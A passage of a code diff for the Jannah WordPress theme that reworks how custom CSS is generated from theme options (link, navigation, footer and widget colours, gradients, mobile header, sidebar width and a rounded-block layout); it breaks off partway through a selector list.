@@ -10,13 +10,27 @@ defined( 'ABSPATH' ) || exit; // Exit if accessed directly
 /*
  * Styles
  */
-if( ! function_exists( 'jannah_get_custom_styling' )){
+if( ! function_exists( 'jannah_get_custom_styling' ) ) {
 
 	add_filter( 'TieLabs/CSS/after_theme_color', 'jannah_get_custom_styling' );
 	function jannah_get_custom_styling( $out = '' ){
 
+		// Theme Blocks style
+		$block_style = tie_get_option( 'blocks_style', 1 );
+
+
+		// Slider Background Position
+		if( $background_position = tie_get_option( 'background_position' ) ) {
+			$out .="
+				.main-slider .slide-bg,
+				.main-slider .slide{
+					background-position: $background_position;
+				}
+			";
+		}
+
 		// Highlighted Color
-		if( $color = tie_get_option( 'highlighted_color' )){
+		if( $color = tie_get_option( 'highlighted_color' ) ) {
 
 			$bright = TIELABS_STYLES::light_or_dark( $color );
 
@@ -34,10 +48,11 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 		// Links Color
-		if( $color = tie_get_option( 'links_color' )){
+		if( $color = tie_get_option( 'links_color' ) ) {
 			$out .="
 				a,
-				.entry a,
+				body .entry a,
+				.dark-skin body .entry a,
 				.comment-list .comment-content a{
 					color: $color;
 				}
@@ -45,10 +60,11 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 		// Links Color Hover
-		if( $color = tie_get_option( 'links_color_hover' )){
+		if( $color = tie_get_option( 'links_color_hover' ) ) {
 			$out .="
 				a:hover,
-				.entry a:hover,
+				body .entry a:hover,
+				.dark-skin body .entry a:hover,
 				.comment-list .comment-content a:hover{
 					color: $color;
 				}
@@ -56,7 +72,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 		// Links hover underline
-		if( tie_get_option( 'underline_links_hover' )){
+		if( tie_get_option( 'underline_links_hover' ) ) {
 			$out .="
 				#content a:hover{
 					text-decoration: underline !important;
@@ -66,7 +82,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 
 		// Theme Main Borders
-		if( $color = tie_get_option( 'borders_color' )){
+		if( $color = tie_get_option( 'borders_color' ) ) {
 
 			$out .="
 				.container-wrapper,
@@ -82,10 +98,10 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				.toggle,
 				.post-content-slideshow,
 				.post-content-slideshow .slider-nav-wrapper,
-				.post-footer-on-bottom,
+				.share-buttons-bottom,
 				.pages-numbers a,
 				.pages-nav-item,
-				.first-last-pages .fa,
+				.first-last-pages .pagination-icon,
 				.multiple-post-pages .post-page-numbers,
 				#story-highlights li,
 				.review-item, .review-summary, .user-rate-wrap,
@@ -163,7 +179,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 
 		// Secondry nav Background
-		if( $color = tie_get_option( 'secondry_nav_background' )){
+		if( $color = tie_get_option( 'secondry_nav_background' ) ) {
 			$dark   = TIELABS_STYLES::color_brightness( $color, -30 );
 			$darker = TIELABS_STYLES::color_brightness( $color, -50 );
 			$bright = TIELABS_STYLES::light_or_dark( $color, true );
@@ -176,7 +192,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				#top-nav .ticker-swipe,
 				.top-nav-boxed #top-nav .topbar-wrapper,
 				.search-in-top-nav.autocomplete-suggestions,
-				#top-nav .guest-btn{
+				#top-nav .guest-btn:not(:hover){
 					background-color : $color;
 				}
 
@@ -192,10 +208,10 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 		// Secondry nav links
-		if( $color = tie_get_option( 'topbar_links_color' )){
+		if( $color = tie_get_option( 'topbar_links_color' ) ) {
 
 			$out .="
-				#top-nav a,
+				#top-nav a:not(:hover),
 				#top-nav input,
 				#top-nav #search-submit,
 				#top-nav .fa-spinner,
@@ -238,7 +254,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 		// Secondry nav links on hover
-		if( $color = tie_get_option( 'topbar_links_color_hover' )){
+		if( $color = tie_get_option( 'topbar_links_color_hover' ) ) {
 
 			$darker = TIELABS_STYLES::color_brightness( $color, -30 );
 			$bright = TIELABS_STYLES::light_or_dark( $color );
@@ -292,7 +308,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 		// Top-bar text
-		if( $color = tie_get_option( 'topbar_text_color' )){
+		if( $color = tie_get_option( 'topbar_text_color' ) ) {
 
 			$rgb = TIELABS_STYLES::rgb_color( $color );
 
@@ -307,11 +323,18 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				.search-in-top-nav.autocomplete-suggestions .post-meta a:not(:hover){
 					color: rgba( $rgb, 0.7 );
 				}
+
+
+				#top-nav .weather-icon .icon-cloud,
+				#top-nav .weather-icon .icon-basecloud-bg,
+				#top-nav .weather-icon .icon-cloud-behind{
+					color: $color !important;
+				}
 			";
 		}
 
 		// Breaking News label
-		if( $color = tie_get_option( 'breaking_title_bg' )){
+		if( $color = tie_get_option( 'breaking_title_bg' ) ) {
 
 			$bright = TIELABS_STYLES::light_or_dark( $color );
 
@@ -332,41 +355,52 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 
-
-
-
-
-
-
 		// Main nav Background
-		if( $color = tie_get_option( 'main_nav_background' )){
+		if( $color = tie_get_option( 'main_nav_background' ) ) {
+
+			$main_nav_selector = tie_get_option( 'main_nav_layout' ) ? '#main-nav .main-menu-wrapper' : '#main-nav';
+
+			if( tie_get_option( 'header_layout' ) == 1 || tie_get_option( 'header_layout' ) == 4 ){
+				$main_nav_selector = '#main-nav';
+			}
 
 			$bright = TIELABS_STYLES::light_or_dark( $color, true );
 			$darker = TIELABS_STYLES::color_brightness( $color, -30 );
-			$rgb    = TIELABS_STYLES::rgb_color( $color );
+
+			// Main nav Gradiant
+			if( $color_2 = tie_get_option( 'main_nav_background_2' ) ) {
+
+				$out .= "
+					.main-nav-boxed .main-nav.fixed-nav,
+					$main_nav_selector{
+						". TIELABS_STYLES::gradiant( $color, $color_2, 90 ) ."
+					}
+
+					$main_nav_selector .icon-basecloud-bg:after{
+						color: inherit !important;
+					}
+				";
+
+				$color = TIELABS_STYLES::average_color( $color, $color_2 ); // The avaerga color
+			}
 
 			$out .="
+				$main_nav_selector,
+				#main-nav .menu-sub-content,
+				#main-nav .comp-sub-menu,
+				#main-nav .guest-btn:not(:hover),
+				#main-nav ul.cats-vertical li a.is-active,
+				#main-nav ul.cats-vertical li a:hover
+				.search-in-main-nav.autocomplete-suggestions{
+					background-color: $color;
+				}
+
 				#main-nav{
-					background-color : $color;
 					border-width: 0;
 				}
 
 				#theme-header #main-nav:not(.fixed-nav){
 					bottom: 0;
-				}
-
-				#main-nav.fixed-nav{
-					background-color : rgba( $rgb , 0.95);
-				}
-
-				#main-nav .main-menu-wrapper,
-				#main-nav .menu-sub-content,
-				#main-nav .comp-sub-menu,
-				#main-nav .guest-btn,
-				#main-nav ul.cats-vertical li a.is-active,
-				#main-nav ul.cats-vertical li a:hover
-				.search-in-main-nav.autocomplete-suggestions{
-					background-color: $color;
 				}
 
 				#main-nav .icon-basecloud-bg:after{
@@ -384,8 +418,9 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 			";
 		}
 
+
 		// Main nav links
-		if( $color = tie_get_option( 'main_nav_links_color' )){
+		if( $color = tie_get_option( 'main_nav_links_color' ) ) {
 
 			$out .= "
 				#main-nav .menu li.menu-item-has-children > a:before,
@@ -405,7 +440,8 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 					border-right-color: $color;
 				}
 
-				#main-nav a,
+				#main-nav a:not(:hover),
+				#main-nav a.social-link:not(:hover) span,
 				#main-nav .dropdown-social-icons li a span,
 				.search-in-main-nav.autocomplete-suggestions a{
 					color: $color;
@@ -437,7 +473,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				}
 			";
 
-			if( tie_get_option( 'main_nav_border_bottom_color' ) || tie_get_option( 'main_nav_border_bottom_width' )){
+			if( tie_get_option( 'main_nav_border_bottom_color' ) || tie_get_option( 'main_nav_border_bottom_width' ) ) {
 				$out .= "
 					.main-nav-boxed #main-nav.fixed-nav{
 						box-shadow: none;
@@ -447,7 +483,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 		// Main nav links on hover
-		if( $color = tie_get_option( 'main_nav_links_color_hover' )){
+		if( $color = tie_get_option( 'main_nav_links_color_hover' ) ) {
 
 			$darker = TIELABS_STYLES::color_brightness( $color, -30 );
 			$bright = TIELABS_STYLES::light_or_dark( $color );
@@ -473,9 +509,9 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 					background-color: $color;
 				}
 
-				.main-nav-light #main-nav .menu ul li:hover > a,
-				.main-nav-light #main-nav .menu ul li.current-menu-item:not(.mega-link-column) > a,
 
+				#main-nav .menu ul li:hover > a,
+				#main-nav .menu ul li.current-menu-item:not(.mega-link-column) > a,
 				#main-nav .components a:hover,
 				#main-nav .components > li:hover > a,
 				#main-nav #search-submit:hover,
@@ -522,7 +558,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		}
 
 		// Main Nav text
-		if( $color = tie_get_option( 'main_nav_text_color' )){
+		if( $color = tie_get_option( 'main_nav_text_color' ) ) {
 
 			$rgb = TIELABS_STYLES::rgb_color( $color );
 
@@ -557,6 +593,12 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				.search-in-main-nav.autocomplete-suggestions .post-meta{
 					color: rgba($rgb, 0.6);
 				}
+
+				#main-nav .weather-icon .icon-cloud,
+				#main-nav .weather-icon .icon-basecloud-bg,
+				#main-nav .weather-icon .icon-cloud-behind{
+					color: $color !important;
+				}
 			";
 		}
 
@@ -564,19 +606,87 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 
 		// In Post links
-		if( tie_get_option( 'post_links_color' )){
+		if( tie_get_option( 'post_links_color' ) ) {
 			$out .='
 			#the-post .entry-content a:not(.shortc-button){
 				color: '. tie_get_option( 'post_links_color' ) .' !important;
 			}';
 		}
 
-		if( tie_get_option( 'post_links_color_hover' )){
+		if( tie_get_option( 'post_links_color_hover' ) ) {
 			$out .='
 			#the-post .entry-content a:not(.shortc-button):hover{
 				color: '. tie_get_option( 'post_links_color_hover' ) .' !important;
 			}';
 		}
+
+
+		// Widget head color
+		if( $color = tie_get_option( 'widgets_head_main_color' ) ) {
+
+			switch ( $block_style ) {
+
+				case 1:
+					$out .="
+						#tie-body .sidebar .widget-title:after{
+							background-color: $color;
+						}
+						#tie-body .sidebar .widget-title:before{
+							border-top-color: $color;
+						}";
+					break;
+
+				case 3:
+				case 10:
+					$out .="
+						#tie-body .sidebar .widget-title:after{
+							background-color: $color;
+						}";
+					break;
+
+				case 2:
+					$out .="
+						#tie-body .sidebar .widget-title{
+							border-color: $color;
+							color: $color;
+						}";
+					break;
+
+				case 4:
+				case 5:
+				case 8:
+					$out .="
+						#tie-body .sidebar .widget-title:before{
+							background-color: $color;
+						}";
+					break;
+
+				case 6:
+					$out .="
+						#tie-body .sidebar .widget-title:before,
+						#tie-body .sidebar .widget-title:after{
+							background-color: $color;
+						}";
+					break;
+
+				case 7:
+					$out .="
+						#tie-body .sidebar .widget-title{
+							background-color: $color;
+						}";
+					break;
+
+				case 11:
+					$direction = is_rtl() ? 'right' : 'left';
+
+					$out .="
+						#tie-body .sidebar .widget-title:after{
+							border-$direction-color: $color;
+						}";
+					break;
+			}
+		}
+
 
 		// Backgrounds
 		$backround_areas = array(
@@ -590,15 +700,15 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 		foreach ( $backround_areas as $area => $elements ){
 
-			if( tie_get_option( $area . '_color' ) || tie_get_option( $area . '_img' )){
+			if( tie_get_option( $area . '_color' ) || tie_get_option( $area . '_img' ) ){
 
-				$background_code  = tie_get_option( $area . '_color' ) ? 'background-color: '. tie_get_option( $area . '_color' ) .';' : '';
+				$background_color = tie_get_option( $area . '_color' ) ? 'background-color: '. tie_get_option( $area . '_color' ) .';' : '';
 				$background_image = tie_get_option( $area . '_img' );
 
 				# Background Image
-				$background_code .= TIELABS_STYLES::bg_image_css( $background_image );
+				$background_image = TIELABS_STYLES::bg_image_css( $background_image );
 
-				if( ! empty( $background_code ) ){
+				if( ! empty( $background_color ) || ! empty( $background_image ) ){
 
 					if( $area == 'mobile_header_bg'  ){
 
@@ -608,28 +718,54 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 								#tie-wrapper #theme-header #main-nav .main-menu-wrapper,
 								#tie-wrapper #theme-header .logo-container{
 									background: transparent;
-								}
+								}';
 
+						// Gradiant
+						if( tie_get_option( 'mobile_header_bg_color_2' ) && empty( $background_image ) ) {
+							$out .= "
 								#tie-wrapper #theme-header .logo-container,
 								#tie-wrapper #theme-header #main-nav {
-									'. $background_code .'
+									". TIELABS_STYLES::gradiant( tie_get_option( 'mobile_header_bg_color' ), tie_get_option( 'mobile_header_bg_color_2' ), 90 ) ."
 								}
-							}
-						';
+								#mobile-header-components-area_1 .components .comp-sub-menu{
+									background-color: ". tie_get_option( 'mobile_header_bg_color' ) .";
+								}
+								#mobile-header-components-area_2 .components .comp-sub-menu{
+									background-color: ". tie_get_option( 'mobile_header_bg_color_2' ) .";
+								}
+							";
+						}
+						else{
+							$out .='
+								#tie-wrapper #theme-header .logo-container,
+								#tie-wrapper #theme-header .logo-container.fixed-nav,
+								#tie-wrapper #theme-header #main-nav {
+									'. $background_color .'
+									'. $background_image .'
+								}
+
+								.mobile-header-components .components .comp-sub-menu{
+									'. $background_color .'
+								}
+							';
+						}
+
+						$out .='}';
 
 					}
 					else{
 
 						$out .=
 							$elements .'{
-								'. $background_code .'
+								'. $background_color .'
+								'. $background_image .'
 							}
 						';
 
-						# Header Mobile Related Colors
+						# Header Related Colors
 						if( $area == 'header_background' ){
 
-							# Text Site Title color
+							// Text Site Title color
 							if( tie_get_option( $area . '_color' ) ){
 
 								$out .='
@@ -646,14 +782,25 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 								';
 							}
 
+							// Gradiant
+							if( tie_get_option( 'header_background_color_2' ) && empty( $background_image ) ) {
+								$out .= "
+									$elements{
+										". TIELABS_STYLES::gradiant( tie_get_option( 'header_background_color' ), tie_get_option( 'header_background_color_2' ), 90 ) ."
+									}
+								";
+							}
+
 							$out .='
 								@media (max-width: 991px){
 									#tie-wrapper #theme-header .logo-container{
-										'. $background_code .'
+									'. $background_color .'
+									'. $background_image .'
 									}
 								}
 							';
 						} // Header Custom Colors
+
 					} // else
 
 				}
@@ -687,13 +834,13 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 			';
 		}
 
-		if( $color = tie_get_option( 'footer_background_color' )){
+		if( $color = tie_get_option( 'footer_background_color' ) ) {
 			$rgb    = TIELABS_STYLES::rgb_color( $color );
 			$darker = TIELABS_STYLES::color_brightness( $color, -30 );
 			$bright = TIELABS_STYLES::light_or_dark( $color, true );
 
 			$out .="
-				#footer .posts-list-counter .posts-list-items li:before{
+				#footer .posts-list-counter .posts-list-items li.widget-post-list:before{
 					border-color: $color;
 				}
 
@@ -746,7 +893,56 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 			";
 		}
 
-		if( tie_get_option( 'footer_title_color' )){
+		if( $color = tie_get_option( 'footer_widgets_head_color' ) ) {
+
+			switch ( $block_style ) {
+
+				case 1:
+				case 2:
+				case 3:
+				case 10:
+					$out .="
+						#tie-body #footer .widget-title::after{
+							background-color: $color;
+						}";
+					break;
+
+				case 4:
+				case 5:
+				case 8:
+					$out .="
+						#tie-body #footer .widget-title::before{
+							background-color: $color;
+						}";
+					break;
+
+				case 6:
+					$out .="
+						#tie-body #footer .widget-title::before,
+						#tie-body #footer .widget-title::after{
+							background-color: $color;
+						}";
+					break;
+
+				case 7:
+					$out .="
+						#tie-body #footer .widget-title{
+							background-color: $color;
+						}";
+					break;
+
+				case 11:
+					$direction = is_rtl() ? 'right' : 'left';
+
+					$out .="
+						#tie-body #footer .widget-title:after{
+							border-$direction-color: $color;
+						}";
+					break;
+			}
+		}
+
+		if( tie_get_option( 'footer_title_color' ) ) {
 			$out .='
 				#footer .widget-title,
 				#footer .widget-title a:not(:hover){
@@ -755,7 +951,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 			';
 		}
 
-		if( $color = tie_get_option( 'footer_text_color' )){
+		if( $color = tie_get_option( 'footer_text_color' ) ) {
 			$rgb = TIELABS_STYLES::rgb_color( $color );
 
 			$out .="
@@ -811,7 +1007,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 			";
 		}
 
-		if( tie_get_option( 'footer_links_color' )){
+		if( tie_get_option( 'footer_links_color' ) ) {
 			$out .='
 				.site-footer.dark-skin a:not(:hover){
 					color: '. tie_get_option( 'footer_links_color' ) .';
@@ -819,7 +1015,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 			';
 		}
 
-		if( $color = tie_get_option( 'footer_links_color_hover' )){
+		if( $color = tie_get_option( 'footer_links_color_hover' ) ) {
 
 			$darker = TIELABS_STYLES::color_brightness( $color, -30 );
 			$bright = TIELABS_STYLES::light_or_dark( $color );
@@ -836,8 +1032,6 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 					stroke: $color;
 				}
 
-				#footer #instagram-link:before,
-				#footer #instagram-link:after,
 				#footer .widget.buddypress .item-options a.selected,
 				#footer .widget.buddypress .item-options a.loading,
 				#footer .tie-slider-nav span:hover,
@@ -856,7 +1050,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				#footer .digital-rating-static,
 				#footer .timeline-widget li a:hover .date:before,
 				#footer #wp-calendar #today,
-				#footer .posts-list-counter .posts-list-items li:before,
+				#footer .posts-list-counter .posts-list-items li.widget-post-list:before,
 				#footer .cat-counter span,
 				#footer.dark-skin .the-global-title:after,
 				#footer .button,
@@ -892,7 +1086,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 
 		// Copyright area
-		if( tie_get_option( 'copyright_text_color' )){
+		if( tie_get_option( 'copyright_text_color' ) ) {
 			$out .='
 			#site-info,
 			#site-info ul.social-icons li a:not(:hover) span{
@@ -900,14 +1094,14 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 			}';
 		}
 
-		if( tie_get_option( 'copyright_links_color' )){
+		if( tie_get_option( 'copyright_links_color' ) ) {
 			$out .='
 			#footer .site-info a:not(:hover){
 				color: '. tie_get_option( 'copyright_links_color' ) .';
 			}';
 		}
 
-		if( tie_get_option( 'copyright_links_color_hover' )){
+		if( tie_get_option( 'copyright_links_color_hover' ) ) {
 			$out .='
 			#footer .site-info a:hover{
 				color: '. tie_get_option( 'copyright_links_color_hover' ) .';
@@ -917,14 +1111,14 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 
 		// Go to Top Button
-		if( tie_get_option( 'back_top_background_color' )){
+		if( tie_get_option( 'back_top_background_color' ) ) {
 			$out .='
 				a#go-to-top{
 					background-color: '. tie_get_option( 'back_top_background_color' ) .';
 				}';
 		}
 
-		if( tie_get_option( 'back_top_text_color' )){
+		if( tie_get_option( 'back_top_text_color' ) ) {
 			$out .='
 				a#go-to-top{
 					color: '. tie_get_option( 'back_top_text_color' ) .';
@@ -933,7 +1127,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 
 		// AdBlock Popup
-		if( $color = tie_get_option( 'adblock_background' )){
+		if( $color = tie_get_option( 'adblock_background' ) ) {
 
 			$bright = TIELABS_STYLES::light_or_dark( $color );
 
@@ -947,9 +1141,9 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 		// Custom Social Networks colors
 		for( $i=1 ; $i<=5 ; $i++ ){
-			if ( tie_get_option( "custom_social_title_$i" ) && ( tie_get_option( "custom_social_icon_img_$i" ) || tie_get_option( "custom_social_icon_$i" ) )&& tie_get_option( "custom_social_url_$i" ) && tie_get_option( "custom_social_color_$i" )){
+			if ( tie_get_option( "custom_social_title_$i" ) && ( tie_get_option( "custom_social_icon_img_$i" ) || tie_get_option( "custom_social_icon_$i" ) ) && tie_get_option( "custom_social_url_$i" ) ) {
 
-				$color = tie_get_option( "custom_social_color_$i" );
+				$color = tie_get_option( "custom_social_color_$i", '#333' );
 
 				$out .="
 					.social-icons-item .custom-link-$i-social-icon{
@@ -963,7 +1157,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 				if( tie_get_option( "custom_social_icon_img_$i" ) ){
 					$out .="
-						.social-icons-item .custom-link-$i-social-icon.custom-social-img span.fa{
+						.social-icons-item .custom-link-$i-social-icon.custom-social-img span.social-icon-img{
 							background-image: url('". tie_get_option( "custom_social_icon_img_$i" ) ."');
 						}
 					";
@@ -975,9 +1169,9 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		// Colored Categories labels
 		$cats_options = get_option( 'tie_cats_options' );
 
-		if( ! empty( $cats_options ) && is_array( $cats_options )){
+		if( ! empty( $cats_options ) && is_array( $cats_options ) ) {
 			foreach ( $cats_options as $cat => $options){
-				if( ! empty( $options['cat_color'] )){
+				if( ! empty( $options['cat_color'] ) ) {
 
 					$cat_custom_color = $options['cat_color'];
 					$bright_color = TIELABS_STYLES::light_or_dark( $cat_custom_color);
@@ -1007,9 +1201,9 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 		// Arqam Plugin Custom colors
 		if( TIELABS_ARQAM_IS_ACTIVE ){
 			$arqam_options = get_option( 'arq_options' );
-			if( ! empty( $arqam_options['color'] ) && is_array( $arqam_options['color'] )){
+			if( ! empty( $arqam_options['color'] ) && is_array( $arqam_options['color'] ) ) {
 				foreach ( $arqam_options['color'] as $social => $color ){
-					if( ! empty( $color )){
+					if( ! empty( $color ) ) {
 						if( $social == '500px' ){
 							$social = 'px500';
 						}
@@ -1029,7 +1223,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 
 
 		// Take Over Ad top margin
-		if( tie_get_option( 'banner_bg' ) && tie_get_option( 'banner_bg_url' ) && tie_get_option( 'banner_bg_site_margin' ) ){
+		if( tie_get_option( 'banner_bg' ) && tie_get_option( 'banner_bg_url' ) && tie_get_option( 'banner_bg_site_margin' ) && ! tie_is_auto_loaded_post() ){
 			$out .= '
 				@media (min-width: 992px){
 					#tie-wrapper{
@@ -1082,9 +1276,36 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 			}
 		}
 
+		// Sidebar Width
+		if( tie_get_option( 'sidebar_width' ) ){
+
+			$sidebar_width = (int) tie_get_option( 'sidebar_width' );
+			$out .= '
+				@media (min-width: 992px){
+					.sidebar{
+						width: '. $sidebar_width .'%;
+					}
+					.main-content{
+						width: '. ( 100 - $sidebar_width ) .'%;
+					}
+				}
+			';
+		}
+
+		// Sticky Share break point
+		if( tie_get_option( 'share_post_sticky' ) ){
+			$sticky_break_point = tie_get_option( 'share_breakpoint_sticky', '1250' );
+			$out .='
+				@media (max-width: '. $sticky_break_point .'px){
+					.share-buttons-sticky{
+						display: none;
+					}
+				}
+			';
+		}
 
 		// Mobile Menu Background
-		if( tie_get_option( 'mobile_menu_active' ) ){
+		if( tie_get_option( 'mobile_header_components_menu' ) ){
 
 			if( tie_get_option( 'mobile_menu_background_type' ) == 'color' ){
 				if( tie_get_option( 'mobile_menu_background_color' ) ){
@@ -1093,9 +1314,6 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 						@media (max-width: 991px){
 							.side-aside #mobile-menu .menu > li{
 								border-color: rgba('.TIELABS_STYLES::light_or_dark( tie_get_option( 'mobile_menu_background_color' ), true ).',0.05);
-							}
-							.side-aside #mobile-search .search-field{
-								background-color: rgba('. TIELABS_STYLES::light_or_dark( tie_get_option( 'mobile_menu_background_color' ), true).',0.05);
 							}
 						}
 					';
@@ -1107,13 +1325,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 					$color1 = tie_get_option( 'mobile_menu_background_gradient_color_1' );
 					$color2 = tie_get_option( 'mobile_menu_background_gradient_color_2' );
 
-					$mobile_bg = '
-						background: '. $color1 .';
-						background: -webkit-linear-gradient(135deg, '. $color1 .', '. $color2 .' );
-						background:    -moz-linear-gradient(135deg, '. $color1 .', '. $color2 .' );
-						background:      -o-linear-gradient(135deg, '. $color1 .', '. $color2 .' );
-						background:         linear-gradient(135deg, '. $color1 .', '. $color2 .' );
-					';
+					$mobile_bg = TIELABS_STYLES::gradiant( $color1, $color2 );
 				}
 			}
 
@@ -1131,19 +1343,6 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 						.side-aside.dark-skin{
 							'.$mobile_bg.'
 						}
-					}
-				';
-			}
-
-			if( tie_get_option( 'mobile_menu_icon_color' ) ){
-				$out .='
-					#mobile-menu-icon .menu-text{
-						color: '. tie_get_option( 'mobile_menu_icon_color' ) .'!important;
-					}
-					#mobile-menu-icon .nav-icon,
-					#mobile-menu-icon .nav-icon:before,
-					#mobile-menu-icon .nav-icon:after{
-						background-color: '. tie_get_option( 'mobile_menu_icon_color' ) .'!important;
 					}
 				';
 			}
@@ -1188,6 +1387,7 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 				';
 			}
 
+			/*
 			if( tie_get_option( 'mobile_menu_search_color' ) ){
 				$search_color = tie_get_option( 'mobile_menu_search_color' );
 				$out .='
@@ -1201,6 +1401,37 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 					}
 				';
 			}
+			*/
+		}
+
+
+		if( tie_get_option( 'mobile_menu_icon_color' ) ){
+			$out .='
+				.mobile-header-components li.custom-menu-link > a,
+				#mobile-menu-icon .menu-text{
+					color: '. tie_get_option( 'mobile_menu_icon_color' ) .'!important;
+				}
+
+				#mobile-menu-icon .nav-icon,
+				#mobile-menu-icon .nav-icon:before,
+				#mobile-menu-icon .nav-icon:after{
+					background-color: '. tie_get_option( 'mobile_menu_icon_color' ) .'!important;
+				}
+			';
+		}
+
+		// Mobile Logo Width
+		if( tie_get_option( 'mobile_logo_width' ) ){
+			$out .='
+				@media (max-width: 991px){
+					#theme-header.has-normal-width-logo #logo img {
+						width:'. tie_get_option( 'mobile_logo_width' ) .'px !important;
+						max-width:100% !important;
+						height: auto !important;
+						max-height: 200px !important;
+					}
+				}
+			';
 		}
 
 		return $out;
@@ -1209,10 +1440,214 @@ if( ! function_exists( 'jannah_get_custom_styling' )){
 }
 
 
-/*
-* Custom Theme Color
-*/
-if( ! function_exists( 'jannah_theme_color_css' )){
+/**
+ * Rounded Layout
+ */
+if( ! function_exists( 'jannah_rounded_blocks_css' ) ) {
+
+	add_filter( 'TieLabs/CSS/after_theme_color', 'jannah_rounded_blocks_css' );
+	function jannah_rounded_blocks_css( $out = '' ){
+
+		if( tie_get_option( 'boxes_style' ) == 3 ){
+
+			$rounded = apply_filters( 'TieLabs/Blocks_Layout/Rounded', '15' );
+
+			$right = ! is_rtl() ? 'right' : 'left';
+			$left  = ! is_rtl() ? 'left'  : 'right';
+
+			if( ! empty( $rounded ) ){
+				$rounded .= 'px';
+
+				$out .= "
+					body a.go-to-top-button,
+					body .more-link,
+					body .button,
+					body [type='submit'],
+					body .generic-button a,
+					body .generic-button button,
+					body textarea,
+					body input:not([type='checkbox']):not([type='radio']),
+					body .mag-box .breaking,
+					body .social-icons-widget .social-icons-item .social-link,
+					body .widget_product_tag_cloud a,
+					body .widget_tag_cloud a,
+					body .post-tags a,
+					body .widget_layered_nav_filters a,
+					body .post-bottom-meta-title,
+					body .post-bottom-meta a,
+					body .post-cat,
+					body .more-link,
+					body .show-more-button,
+					body #instagram-link.is-expanded .follow-button,
+					body .cat-counter a + span,
+					body .mag-box-options .slider-arrow-nav a,
+					body .main-menu .cats-horizontal li a,
+					body #instagram-link.is-compact,
+					body .pages-numbers a,
+					body .pages-nav-item,
+					body .bp-pagination-links .page-numbers,
+					body .fullwidth-area .widget_tag_cloud .tagcloud a,
+					body .header-layout-1 #main-nav .components #search-input,
+					body ul.breaking-news-nav li.jnt-prev,
+					body ul.breaking-news-nav li.jnt-next{
+						border-radius: 35px;
+					}
+
+					body .mag-box ul.breaking-news-nav li{
+						border: 0 !important;
+					}
+
+					body #instagram-link.is-compact{
+						padding-right: 40px;
+						padding-left: 40px;
+					}
+
+					body .post-bottom-meta-title,
+					body .post-bottom-meta a,
+					body .post-cat,
+					body .more-link{
+						padding-right: 15px;
+						padding-left: 15px;
+					}
+
+					body #masonry-grid .container-wrapper .post-thumb img{
+						border-radius: 0px;
+					}
+
+					body .video-thumbnail,
+					body .review-item,
+					body .review-summary,
+					body .user-rate-wrap,
+					body textarea,
+					body input,
+					body select{
+						border-radius: 5px;
+					}
+
+					body .post-content-slideshow,
+					body #tie-read-next,
+					body .prev-next-post-nav .post-thumb,
+					body .post-thumb img,
+					body .container-wrapper,
+					body .tie-popup-container .container-wrapper,
+					body .widget,
+					body .grid-slider-wrapper .grid-item,
+					body .slider-vertical-navigation .slide,
+					body .boxed-slider:not(.grid-slider-wrapper) .slide,
+					body .buddypress-wrap .activity-list .load-more a,
+					body .buddypress-wrap .activity-list .load-newest a,
+					body .woocommerce .products .product .product-img img,
+					body .woocommerce .products .product .product-img,
+					body .woocommerce .woocommerce-tabs,
+					body .woocommerce div.product .related.products,
+					body .woocommerce div.product .up-sells.products,
+					body .woocommerce .cart_totals, .woocommerce .cross-sells,
+					body .big-thumb-left-box-inner,
+					body .miscellaneous-box .posts-items li:first-child,
+					body .single-big-img,
+					body .masonry-with-spaces .container-wrapper .slide,
+					body .news-gallery-items li .post-thumb,
+					body .scroll-2-box .slide,
+					.magazine1.archive:not(.bbpress) .entry-header-outer,
+					.magazine1.search .entry-header-outer,
+					.magazine1.archive:not(.bbpress) .mag-box .container-wrapper,
+					.magazine1.search .mag-box .container-wrapper,
+					body.magazine1 .entry-header-outer + .mag-box,
+					body .digital-rating-static,
+					body .entry q,
+					body .entry blockquote,
+					body #instagram-link.is-expanded,
+					body.single-post .featured-area,
+					body.post-layout-8 #content,
